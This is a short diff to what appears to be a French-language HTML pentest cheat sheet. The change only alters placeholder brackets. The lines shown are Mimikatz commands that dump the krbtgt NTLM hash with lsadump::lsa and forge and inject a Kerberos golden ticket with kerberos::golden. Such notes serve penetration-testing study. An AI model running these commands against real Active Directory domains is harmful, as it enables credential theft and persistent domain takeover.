@@ -19,4 +19,4 @@ get-WmiObject -class Win32_Share
 <h2>Mimikatz</h2>
 privilege::debug</br>
 lsadump::lsa /inject /name:krbtgt → Récupérer le NTLM hash de krbtgt</br>
-kerberos::golden /user:USER /domain:DOMAIN.LOCAL /sid:<SID de USER> /krbtgt:<NTLM hash de krbtgt> /ticket:evil.tck /ptt → Créé et inject un golden ticket à la session</br>
+kerberos::golden /user:[USER] /domain:[DOMAINE] /sid:[SID de USER] /krbtgt:[NTLM hash de krbtgt] /ticket:evil.tck /ptt → Créé et inject un golden ticket à la session</br>
